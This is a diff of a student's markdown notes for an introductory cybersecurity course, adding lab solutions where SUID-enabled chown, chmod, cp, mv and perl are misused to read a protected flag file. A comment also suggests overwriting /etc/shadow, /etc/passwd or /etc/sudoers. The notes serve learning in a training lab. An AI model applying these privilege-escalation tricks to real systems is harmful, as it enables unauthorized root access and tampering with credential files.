@@ -14,11 +14,11 @@ categories:
 
 ---
 
-# ASU CSE 365
+# Program Misuse
 
-## Program Misuse
+-----------**ASU CSE 365**: Introduction to Cybersecurity
 
-### Program Interaction:Linux Command Line
+## Program Interaction:Linux Command Line
 
 ①	**Learning the command line**
 
@@ -59,7 +59,7 @@ echo echo hi | bash	#hi
 
 `<in_file`、`>outfile`、`>>out_file`、`2>error_file`、`2>>error_file`
 
-### Program Misuse:Privilege Escalation
+## Program Misuse:Privilege Escalation
 
 ①	**permission model**
 
@@ -98,11 +98,11 @@ sudo chown root.root xxx #it will cancel the 's' user:rws--->rwx
 sudo chmod g+s xxx 	#group:rwx--->rws
 ```
 
-### Program Misuse:Mitigations
+## Program Misuse:Mitigations
 
 
 
-### babysuid challenge
+## babysuid challenge
 
 **init:** we can use the Desktop or the Workspace(then change to the terminal) to operate.
 
@@ -378,3 +378,49 @@ exit from this command
 `(.,.)p:` Prints the addressed lines. If invoked from a terminal, **ed** pauses at the end of each page until a newline is entered. The current address is set to the last line printed.
 
 `q:` quits ed
+
+**doing tricks with permissions**
+
+level 37: **chown**
+
+```shell
+chown hacker:hacker flag
+cat flag
+```
+
+level 38: **chmod**
+
+```shell
+chmod 777 flag
+cat flag
+```
+
+level 39: **cp**
+
+```shell
+cp flag /dev/stdout #can read the flag
+#if put the echo of the output to /dev/stdout, it will be sent directly to the standard output(the screen)
+echo "xx" | cp /dev/stdin flag #this can write the 'xx' to the flag
+```
+
+level 40: **mv**
+
+```shell
+mv /usr/bin/cat /usr/bin/mv # overwrite the mv, use the mv actually run the cat
+./babysuid_level40 #execute the program
+mv flag #get the flag
+#the normal way to use the 'mv' is overwrite the /etc/shadow or /etc/passwd or /etc/sudoers
+```
+
+**let you program anything**
+
+level 41: **perl**---> extract the language practical statements
+
+> Usage: perl [options] [program file] [para]
+
+```shell
+perl -ne print flag	#can read the flag
+#-n:resume the "while(<>){..}" with the program circulating
+#-e:can make the Perl program run in the terminal
+```
+
